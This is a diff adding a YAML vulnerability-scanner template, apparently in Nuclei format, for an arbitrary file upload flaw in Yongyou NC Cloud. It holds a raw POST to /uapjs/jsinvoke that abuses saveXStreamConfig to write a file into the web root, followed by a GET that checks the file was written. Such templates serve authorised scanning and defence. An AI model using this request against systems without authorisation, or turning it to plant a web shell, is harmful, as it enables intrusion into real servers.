@@ -1,0 +1,43 @@
+id: poc-yaml-yongyou-nc-cloud-jsinvoke-file-upload
+info:
+  name: Yongyou NC Cloud jsinvoke Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  metadata:
+    finger: Yongyou-NC-Cloud
+
+variables:
+  t1: "{{rand_base(8)}}"
+  t2: "{{md5(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    raw:
+      - |
+        POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["{{t2}}","webapps/nc_web/{{t1}}.txt"]}
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/webapps/nc_web/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+          - "<string>"
